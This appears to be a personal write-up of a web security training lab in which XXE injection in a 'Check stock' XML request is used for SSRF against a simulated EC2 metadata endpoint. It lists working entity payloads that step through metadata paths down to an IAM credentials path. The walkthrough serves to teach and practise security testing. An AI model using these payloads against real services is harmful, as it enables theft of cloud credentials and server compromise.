# Exploiting XXE to perform SSRF attacks

## Lab #2: Exploiting XXE to perform SSRF attacks

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> 
> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
> 
> To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

Check stock request

![ccae14b8bd448b6116d31af34a82b589.png](_resources/baa0397e323241c5b9f817cd7adf3899.png)

Injecting XXE

```
<!DOCTYPE notused [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/">] >
```

Returns an error message "Invalid product ID: latest"

![9ef4b9f342c2e19b3e0c7b97f1b038f3.png](_resources/00bf0f9b225143b3a6f359eaeabf2dcd.png)

Adding a random path to the url, returns non zero code.

![9c72dcfd0cd2c34591a1f8a5c527b547.png](_resources/d7b8ff7f475b46e389f48a1715e6aab9.png)

Adding `/latest` as new path returns another error message "Invalid product ID: meta-data". I can assume the first payload return a path.

```
<!DOCTYPE notused [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/">] >
```

Combining the path to `/latest/meta-data/`
```
<!DOCTYPE notused [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data">] >
```

![d4d7ab35e037c1ceccb12f4f7fead4e5.png](_resources/d7ec0e8d754f4b21a8e86d87a1693d60.png)


It ends up with:

```
<!DOCTYPE notused [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">] >
```

![21475d841258379c7dbf1e7621612bd9.png](_resources/7120752290f1488f801df57ed4ee2d8d.png)